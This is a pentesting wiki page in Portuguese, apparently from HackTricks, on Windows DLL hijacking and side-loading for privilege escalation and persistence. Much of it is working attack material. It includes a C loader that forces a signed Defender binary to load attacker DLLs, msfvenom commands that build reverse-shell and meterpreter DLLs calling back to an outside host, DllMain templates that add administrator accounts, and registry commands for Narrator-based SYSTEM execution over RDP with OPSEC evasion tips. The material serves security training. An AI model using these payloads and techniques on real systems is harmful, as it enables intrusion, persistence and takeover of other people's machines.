# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informação Básica

DLL Hijacking envolve manipular uma aplicação confiável para carregar uma DLL maliciosa. Este termo abrange várias táticas como **DLL Spoofing, Injection, and Side-Loading**. É usado principalmente para execução de código, obtenção de persistência e, menos comumente, escalonamento de privilégios. Apesar do foco em escalonamento aqui, o método de hijacking permanece consistente entre os objetivos.

### Técnicas Comuns

Vários métodos são empregados para DLL hijacking, cada um com sua efetividade dependendo da estratégia de carregamento de DLLs da aplicação:

1. **DLL Replacement**: Trocar uma DLL genuína por uma maliciosa, opcionalmente usando DLL Proxying para preservar a funcionalidade da DLL original.
2. **DLL Search Order Hijacking**: Colocar a DLL maliciosa em um caminho de busca à frente da legítima, explorando o padrão de busca da aplicação.
3. **Phantom DLL Hijacking**: Criar uma DLL maliciosa para a aplicação carregar, fazendo-a acreditar que se trata de uma DLL necessária inexistente.
4. **DLL Redirection**: Modificar parâmetros de busca como %PATH% ou arquivos .exe.manifest / .exe.local para redirecionar a aplicação para a DLL maliciosa.
5. **WinSxS DLL Replacement**: Substituir a DLL legítima por uma maliciosa no diretório WinSxS, método frequentemente associado com DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar a DLL maliciosa em um diretório controlado pelo usuário junto com a aplicação copiada, assemelhando-se a técnicas de Binary Proxy Execution.

> [!TIP]
> Para uma cadeia passo-a-passo que empilha HTML staging, AES-CTR configs, e .NET implants sobre DLL sideloading, reveja o workflow abaixo.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Encontrando Dlls ausentes

A maneira mais comum de encontrar Dlls ausentes dentro de um sistema é executar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) do sysinternals, **definindo** os **seguintes 2 filtros**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

e apenas mostrar a **File System Activity**:

![](<../../../images/image (153).png>)

Se você está procurando por **Dlls ausentes em geral** deixe isso rodando por alguns **segundos**.\
Se você está procurando por uma **dll ausente dentro de um executável específico** você deve definir **outro filtro como "Process Name" "contains" `<exec name>`, executá-lo, e parar a captura de eventos**.

## Explorando Dlls Ausentes

Para escalar privilégios, a melhor chance que temos é conseguir **escrever uma dll que um processo privilegiado tentará carregar** em algum **local onde ela será procurada**. Portanto, poderemos **escrever** uma dll em uma **pasta** onde a **dll seja procurada antes** da pasta onde está a **dll original** (caso estranho), ou seremos capazes de **escrever em alguma pasta onde a dll será procurada** e a **dll original não exista** em nenhuma pasta.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

As aplicações Windows procuram por DLLs seguindo um conjunto de caminhos de busca pré-definidos, obedecendo a uma sequência particular. O problema de DLL hijacking surge quando uma DLL maliciosa é colocada estrategicamente em um desses diretórios, assegurando que seja carregada antes da DLL autêntica. Uma solução para prevenir isso é garantir que a aplicação use caminhos absolutos ao referenciar as DLLs que necessita.

Você pode ver a ordem de busca de DLLs em sistemas 32-bit abaixo:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Essa é a ordem de busca **default** com o **SafeDllSearchMode** habilitado. Quando desabilitado, o diretório atual sobe para a segunda posição. Para desabilitar esse recurso, crie o valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e defina-o como 0 (o padrão é habilitado).

Se a função [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) for chamada com **LOAD_WITH_ALTERED_SEARCH_PATH**, a busca começa no diretório do módulo executável que **LoadLibraryEx** está carregando.

Finalmente, note que **uma dll pode ser carregada indicando o caminho absoluto ao invés apenas do nome**. Nesse caso, essa dll será **procurada somente nesse caminho** (se a dll tiver dependências, elas serão procuradas como carregadas apenas pelo nome).

Existem outras maneiras de alterar a ordem de busca, mas não as explicarei aqui.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Uma forma avançada de influenciar de maneira determinística o caminho de busca de DLLs de um processo recém-criado é definir o campo DllPath em RTL_USER_PROCESS_PARAMETERS ao criar o processo com as APIs nativas de ntdll. Ao fornecer aqui um diretório controlado pelo atacante, um processo alvo que resolva uma DLL importada pelo nome (sem caminho absoluto e sem usar as flags de carregamento seguro) pode ser forçado a carregar uma DLL maliciosa desse diretório.

Ideia principal
- Construa os parâmetros do processo com RtlCreateProcessParametersEx e forneça um DllPath customizado que aponte para sua pasta controlada (ex.: o diretório onde seu dropper/unpacker reside).
- Crie o processo com RtlCreateUserProcess. Quando o binário alvo resolver uma DLL pelo nome, o loader consultará esse DllPath fornecido durante a resolução, permitindo sideloading confiável mesmo quando a DLL maliciosa não está colocalizada com o EXE alvo.

Notas/limitações
- Isso afeta o processo filho sendo criado; é diferente de SetDllDirectory, que afeta apenas o processo atual.
- O alvo deve importar ou chamar LoadLibrary de uma DLL pelo nome (sem caminho absoluto e sem usar LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e caminhos absolutos hardcoded não podem ser hijackeados. Forwarded exports e SxS podem alterar precedência.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Exemplo C completo: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Exemplo de uso operacional
- Coloque um xmllite.dll malicioso (exportando as funções requeridas ou fazendo proxy para o verdadeiro) no seu diretório DllPath.
- Execute um binário assinado conhecido por procurar xmllite.dll por nome usando a técnica acima. O loader resolve o import via o DllPath fornecido e sideloads seu DLL.

Esta técnica foi observada in-the-wild para conduzir cadeias de sideloading multi-estágio: um launcher inicial deposita um DLL auxiliar, que então cria um binário Microsoft-signed hijackable com um DllPath customizado para forçar o carregamento do DLL do atacante a partir de um diretório de staging.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- Quando uma **DLL que compartilha seu nome com uma já carregada na memória** é encontrada, o sistema ignora a busca habitual. Em vez disso, ele realiza uma verificação por redirection e um manifest antes de usar a DLL já presente na memória. **Nesse cenário, o sistema não realiza uma busca pela DLL**.
- Nos casos em que a DLL é reconhecida como uma **known DLL** para a versão corrente do Windows, o sistema utilizará sua versão da known DLL, junto com quaisquer DLLs dependentes, **dispensando o processo de busca**. A chave de registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contém a lista dessas known DLLs.
- Caso uma **DLL possua dependências**, a busca por essas DLLs dependentes é conduzida como se fossem indicadas apenas por seus **module names**, independentemente de a DLL inicial ter sido identificada através de um caminho completo.

### Elevação de privilégios

**Requisitos**:

- Identificar um processo que opere ou venha a operar sob **privilégios diferentes** (movimento horizontal ou lateral), que esteja **sem uma DLL**.
- Garantir que exista **acesso de escrita** em qualquer **diretório** onde a **DLL** será **procurada**. Essa localização pode ser o diretório do executável ou um diretório dentro do PATH do sistema.

Sim, os requisitos são complicados de encontrar pois **por padrão é meio estranho encontrar um executável privilegiado sem uma DLL** e é ainda **mais estranho ter permissões de escrita em uma pasta do PATH do sistema** (você não pode por padrão). Mas, em ambientes mal configurados isso é possível.\
Se você tiver sorte e encontrar os requisitos acima, pode checar o projeto [UACME](https://github.com/hfiref0x/UACME). Mesmo que o **objetivo principal do projeto seja bypass UAC**, você pode encontrar lá um **PoC** de um Dll hijacking para a versão do Windows que pode usar (provavelmente apenas mudando o caminho da pasta onde você tem permissões de escrita).

Note que você pode **verificar suas permissões em uma pasta** fazendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **verifique as permissões de todas as pastas dentro do PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Você também pode verificar os imports de um executável e os exports de uma dll com:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para um guia completo sobre como **abusar de Dll Hijacking para escalar privilégios** com permissões para gravar em uma **pasta do System Path** veja:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Ferramentas automatizadas

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)verificará se você tem permissões de gravação em qualquer pasta dentro do system PATH.\
Outras ferramentas automatizadas interessantes para descobrir essa vulnerabilidade são as **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Exemplo

Caso você encontre um cenário explorável, uma das coisas mais importantes para explorá-lo com sucesso seria **criar uma dll que exporte pelo menos todas as funções que o executável irá importar dela**. Note que Dll Hijacking é útil para [escalar de Medium Integrity level para High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou de[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Você pode encontrar um exemplo de **como criar uma dll válida** dentro deste estudo de dll hijacking focado em dll hijacking para execução: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Além disso, na **próxima seção** você pode encontrar alguns **códigos dll básicos** que podem ser úteis como **templates** ou para criar uma **dll com funções não necessárias exportadas**.

## **Criando e compilando Dlls**

### **Dll Proxifying**

Basicamente um **Dll proxy** é uma Dll capaz de **executar seu código malicioso quando carregada** mas também de **expor** e **funcionar** como **esperado** ao **encaminhar todas as chamadas para a biblioteca real**.

Com a ferramenta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus) você pode, na prática, **indicar um executável e selecionar a biblioteca** que deseja proxificar e **gerar uma dll proxificada** ou **indicar a Dll** e **gerar uma dll proxificada**.

### **Meterpreter**

**Obter rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obter um meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Criar um usuário (x86; não vi uma versão x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Seu próprio

Observe que, em vários casos, a Dll que você compila deve **export several functions** que serão carregadas pelo victim process; se essas functions não existirem, o **binary won't be able to load** tais functions e o **exploit will fail**.

<details>
<summary>Modelo de DLL em C (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL exemplo com criação de usuário</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativa com thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Estudo de Caso: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

O Windows Narrator.exe ainda procura uma DLL de localização previsível e específica por idioma na inicialização que pode ser hijacked para arbitrary code execution and persistence.

Key facts
- Caminho de verificação (compilações atuais): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Caminho legado (compilações mais antigas): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se uma DLL controlada pelo atacante e gravável existir no caminho OneCore, ela será carregada e `DllMain(DLL_PROCESS_ATTACH)` será executada. Nenhuma exportação é necessária.

Descoberta com Procmon
- Filtro: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Inicie o Narrator e observe a tentativa de carregamento do caminho acima.

DLL mínima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Um hijack ingênuo irá falar/destacar a UI. Para permanecer silencioso, ao attach enumere as threads do Narrator, abra a thread principal (`OpenThread(THREAD_SUSPEND_RESUME)`) e `SuspendThread` nela; continue na sua própria thread. Veja o PoC para o código completo.

Trigger and persistence via Accessibility configuration
- Contexto do usuário (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Com o acima, iniciar o Narrator carrega a DLL plantada. No secure desktop (tela de logon), pressione CTRL+WIN+ENTER para iniciar o Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Permitir camada de segurança RDP clássica: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP para o host, na tela de logon pressione CTRL+WIN+ENTER para lançar o Narrator; sua DLL executa como SYSTEM no secure desktop.
- A execução para quando a sessão RDP é encerrada—injete/migre rapidamente.

Bring Your Own Accessibility (BYOA)
- Você pode clonar uma entrada de registro de Accessibility Tool (AT) embutida (ex.: CursorIndicator), editá-la para apontar para um binário/DLL arbitrário, importar, e então definir `configuration` para esse nome de AT. Isso proxya execução arbitrária sob o framework Accessibility.

Notes
- Escrever em `%windir%\System32` e alterar valores HKLM requer privilégios de administrador.
- Toda a lógica do payload pode residir em `DLL_PROCESS_ATTACH`; não são necessários exports.

## Estudo de Caso: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Detalhes da Vulnerabilidade

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Implementação do Exploit

Um atacante pode colocar um stub malicioso `hostfxr.dll` no mesmo diretório, explorando a DLL ausente para obter execução de código no contexto do usuário:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Fluxo do Ataque

1. Como usuário padrão, coloque `hostfxr.dll` em `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Aguarde a tarefa agendada executar às 9:30 no contexto do usuário atual.
3. Se um administrador estiver conectado quando a tarefa for executada, a DLL maliciosa será executada na sessão do administrador com integridade média.
4. Encadeie técnicas padrão de bypass do UAC para elevar de integridade média para privilégios SYSTEM.

## Estudo de Caso: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Atores de ameaça frequentemente combinam droppers baseados em MSI com DLL side-loading para executar payloads sob um processo confiável e assinado.

Chain overview
- O usuário baixa o MSI. Uma CustomAction é executada silenciosamente durante a instalação GUI (por exemplo, LaunchApplication ou uma ação VBScript), reconstruindo a próxima etapa a partir de recursos embutidos.
- O dropper grava um EXE legítimo e assinado e uma DLL maliciosa no mesmo diretório (par de exemplo: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Quando o EXE assinado é iniciado, a ordem de pesquisa de DLL do Windows carrega wsc.dll do diretório de trabalho primeiro, executando o código do atacante sob um pai assinado (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Procure entradas que executem executáveis ou VBScript. Padrão suspeito de exemplo: LaunchApplication executando um arquivo embutido em segundo plano.
- No Orca (Microsoft Orca.exe), inspecione as tabelas CustomAction, InstallExecuteSequence e Binary.
- Embedded/split payloads in the MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Procure por vários pequenos fragmentos que são concatenados e descriptografados por uma VBScript CustomAction. Fluxo comum:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Sideloading prático com wsc_proxy.exe
- Coloque estes dois arquivos na mesma pasta:
- wsc_proxy.exe: host legítimo assinado (Avast). O processo tenta carregar wsc.dll pelo nome a partir do seu diretório.
- wsc.dll: DLL do atacante. Se nenhum exports específico for necessário, DllMain pode ser suficiente; caso contrário, construa um proxy DLL e encaminhe os exports necessários para a biblioteca genuína enquanto executa o payload em DllMain.
- Crie um payload DLL mínimo:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Para requisitos de export, use um framework de proxy (por exemplo, DLLirant/Spartacus) para gerar uma forwarding DLL que também execute seu payload.

- Essa técnica depende da resolução do nome da DLL pelo binário hospedeiro. Se o host usar caminhos absolutos ou flags de carregamento seguro (por exemplo, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), o hijack pode falhar.
- KnownDLLs, SxS, and forwarded exports podem influenciar a precedência e devem ser considerados durante a seleção do binário hospedeiro e do conjunto de exports.

## Referências

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
